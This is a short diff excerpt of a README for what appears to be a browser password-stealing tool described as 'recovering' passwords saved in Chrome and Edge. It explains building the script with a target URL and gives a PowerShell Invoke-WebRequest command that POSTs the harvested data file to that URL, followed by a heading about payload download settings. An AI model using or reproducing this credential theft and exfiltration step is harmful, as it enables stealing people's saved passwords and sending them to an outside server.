@@ -5,11 +5,13 @@ Allows you to recover passwords stored in Chrome and Edge browsers. It also allo
 # Build
 
 The script to use must be generated with the make command, specifying the URL which will be used to recover the passwords:
+
     make URL=http://example.com
 
 # Data recovery
 
 The data will be sent to the URL specified during make with the following powershell command:
+
     Invoke-WebRequest -Uri http://example.com -Method POST -InFile /tmp/data
 
 # Download payload settings
